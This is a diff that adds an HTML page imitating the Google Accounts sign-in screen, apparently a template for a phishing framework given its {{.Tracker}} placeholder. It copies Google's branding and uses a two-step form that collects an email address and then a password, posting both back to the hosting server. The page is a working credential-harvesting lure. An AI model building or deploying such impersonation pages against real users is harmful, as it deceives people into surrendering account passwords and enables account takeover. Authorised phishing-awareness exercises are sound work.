@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            max-width: 450px;
+            width: 100%;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .logo-text {
+            font-size: 24px;
+            color: #202124;
+            font-weight: 400;
+            letter-spacing: -0.5px;
+        }
+        .google-logo {
+            width: 75px;
+            height: 24px;
+            display: inline-block;
+            background: linear-gradient(90deg, #4285f4 0%, #ea4335 33%, #fbbc04 66%, #34a853 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: bold;
+            font-size: 22px;
+            letter-spacing: -1px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin: 8px 0 0;
+            text-align: center;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #202124;
+            margin: 8px 0 24px;
+            text-align: center;
+            font-weight: 400;
+        }
+        .form-group {
+            margin-bottom: 24px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+        }
+        input[type="email"],
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+        .forgot-email {
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+        .info-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin: 16px 0 24px;
+        }
+        .info-text a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+        .create-account {
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            letter-spacing: 0.25px;
+        }
+        .next-button:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        .footer {
+            margin-top: 48px;
+            padding-top: 24px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .footer select {
+            border: none;
+            background: transparent;
+            color: #5f6368;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 24px;
+        }
+        .footer-links a:hover {
+            color: #202124;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <span class="google-logo">Google</span>
+        </div>
+        
+        <h1>Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
+        
+        <form method="POST" action="?" id="loginForm">
+            <div class="form-group">
+                <input 
+                    type="text" 
+                    id="email" 
+                    name="email" 
+                    placeholder="Email or phone" 
+                    required 
+                    autocomplete="username"
+                >
+            </div>
+            
+            <div class="form-group" id="passwordGroup" style="display: none;">
+                <input 
+                    type="password" 
+                    id="password" 
+                    name="password" 
+                    placeholder="Enter your password" 
+                    required 
+                    autocomplete="current-password"
+                >
+            </div>
+            
+            <div style="text-align: left; margin-top: -8px;">
+                <a href="#" class="forgot-email">Forgot email?</a>
+            </div>
+            
+            <p class="info-text">
+                Not your computer? Use Guest mode to sign in privately.
+                <a href="#">Learn more</a>
+            </p>
+            
+            <div class="buttons">
+                <a href="#" class="create-account">Create account</a>
+                <button type="submit" class="next-button" id="submitBtn">Next</button>
+            </div>
+        </form>
+        
+        <div class="footer">
+            <div>
+                <select>
+                    <option>English (Australia)</option>
+                    <option>English (United States)</option>
+                    <option>English (United Kingdom)</option>
+                </select>
+            </div>
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let emailEntered = false;
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const submitBtn = document.getElementById('submitBtn');
+        
+        form.addEventListener('submit', function(e) {
+            if (!emailEntered && emailInput.value) {
+                e.preventDefault();
+                emailEntered = true;
+                passwordGroup.style.display = 'block';
+                emailInput.setAttribute('readonly', true);
+                document.getElementById('password').focus();
+            }
+        });
+    </script>
+    
+    {{.Tracker}}
+</body>
+</html>
